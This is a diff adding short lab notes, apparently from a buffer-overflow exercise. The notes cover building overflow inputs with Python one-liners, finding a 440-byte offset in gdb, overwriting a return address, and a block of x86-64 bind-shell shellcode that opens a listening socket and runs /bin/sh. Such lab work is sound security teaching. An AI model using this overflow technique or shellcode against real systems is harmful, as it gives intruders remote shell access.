@@ -1,0 +1,26 @@
+EC Notes:
+step_2: python -c 'print "A"*440' > step_2
+step_2: 0x555555550a0d
+
+step_3: <COMMAND TO SHOW VALUE AT SPECIFIC LOCATION> = x/s 0x41386f41376f4136
+f 0   0x5555555551a9 unsafe+84
+   f 1 0x41386f41376f4136
+   f 2 0x317041307041396f
+   f 3 0x7041337041327041
+   f 4 0x4136704135704134
+   f 5 0x3970413870413770
+   f 6 0x7141317141307141
+   f 7 0x4134714133714132
+
+step_4: length is 440
+
+step_5: python -c 'print "A"*440 + "\xef\xbe\xad\xde\xff\xff\xff\xff"' > step_5
+
+step_6:
+buf =  b""
+buf += b"\x6a\x29\x58\x99\x6a\x01\x5e\x6a\x02\x5f\x0f\x05\x97"
+buf += b"\xb0\x32\x0f\x05\x96\xb0\x2b\x0f\x05\x97\x96\xff\xce"
+buf += b"\x6a\x21\x58\x0f\x05\x75\xf7\x52\x48\xbf\x2f\x2f\x62"
+buf += b"\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05"
+
+
